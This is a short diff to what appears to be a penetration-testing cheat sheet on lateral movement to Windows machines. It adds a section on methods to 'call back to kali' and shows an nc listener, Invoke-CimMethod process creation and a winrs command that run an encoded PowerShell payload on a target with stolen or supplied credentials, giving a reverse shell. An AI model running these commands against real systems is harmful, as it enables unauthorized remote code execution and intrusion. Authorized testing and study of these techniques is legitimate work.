@@ -1,5 +1,5 @@
 If a user isn't in "Remote Users" group, it may be inaccessible with options like rdp, winrm or psexec.
-
+# Powershell command generation
 Python script to encode powershell command:
 ```python
 import sys
@@ -17,6 +17,8 @@ python3 encode.py
 ```bash
 nc -lvnp $(LPORT)
 ```
+# Methods to call back to kali
+## Invoke-CimMethod
 On the target machine, run the following:
 ```powershell
 $username = '$(USERNAME)';
@@ -41,4 +43,8 @@ $Command = '$(OUTPUT_OF_PYTHON_SCRIPT)';
 ```
 ```powershell
 Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
+```
+## Winrs
+```batch
+winrs -r:$(HOSTNAME_OF_TARGET) -u:$(USERNAME) -p:$(PASSWORD)  "$(OUTPUT_OF_PYTHON_SCRIPT)"
 ```
